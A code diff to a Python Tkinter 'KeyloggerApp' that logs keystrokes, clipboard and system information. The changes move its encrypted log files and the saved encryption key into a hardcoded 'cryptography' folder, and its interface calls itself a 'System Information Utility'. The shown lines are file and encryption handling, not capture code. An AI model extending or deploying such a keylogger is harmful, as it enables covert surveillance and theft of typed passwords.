@@ -46,6 +46,12 @@ class KeyloggerApp:
         self.extend = "\\"
         self.file_merge = self.file_path + self.extend
         
+        # Set specific path for Cryptography folder
+        self.cryptography_folder = r"C:\Users\ymani\OneDrive\Desktop\Keylogger-main\cryptography"
+        if not os.path.exists(self.cryptography_folder):
+            os.makedirs(self.cryptography_folder)
+            self.log_message(f"Created Cryptography folder at: {self.cryptography_folder}")
+        
         self.keys_information = "key_log.txt"
         self.system_information = "systeminfo.txt"
         self.clipboard_information = "clipboard.txt"
@@ -60,8 +66,15 @@ class KeyloggerApp:
         self.time_iteration = 15
         self.number_of_iterations_end = 3
         
+        # Generate and save encryption key
         self.key = Fernet.generate_key()
         self.fernet = Fernet(self.key)
+        
+        # Save the key to a file in the Cryptography folder
+        self.key_file = os.path.join(self.cryptography_folder, "encryption_key.key")
+        with open(self.key_file, "wb") as key_file:
+            key_file.write(self.key)
+        self.log_message(f"Encryption key saved to: {self.key_file}")
         
         self.is_running = False
         self.keylogger_thread = None
@@ -70,6 +83,7 @@ class KeyloggerApp:
         
         self.log_area.insert(tk.END, "System Information Utility initialized.\n")
         self.log_area.insert(tk.END, f"Working directory: {self.file_path}\n")
+        self.log_area.insert(tk.END, f"Cryptography folder: {self.cryptography_folder}\n")
         self.log_area.insert(tk.END, "Ready to start monitoring...\n")
         self.log_area.see(tk.END)
 
@@ -163,9 +177,9 @@ class KeyloggerApp:
         ]
         
         encrypted_file_names = [
-            self.file_merge + self.system_information_e, 
-            self.file_merge + self.clipboard_information_e, 
-            self.file_merge + self.keys_information_e
+            os.path.join(self.cryptography_folder, self.system_information_e),
+            os.path.join(self.cryptography_folder, self.clipboard_information_e),
+            os.path.join(self.cryptography_folder, self.keys_information_e)
         ]
         
         for i, file_path in enumerate(files_to_encrypt):
@@ -178,7 +192,7 @@ class KeyloggerApp:
                 with open(encrypted_file_names[i], 'wb') as f:
                     f.write(encrypted)
                     
-                self.log_message(f"Encrypted: {os.path.basename(file_path)}")
+                self.log_message(f"Encrypted: {os.path.basename(file_path)} → {os.path.basename(encrypted_file_names[i])}")
             except Exception as e:
                 self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
         
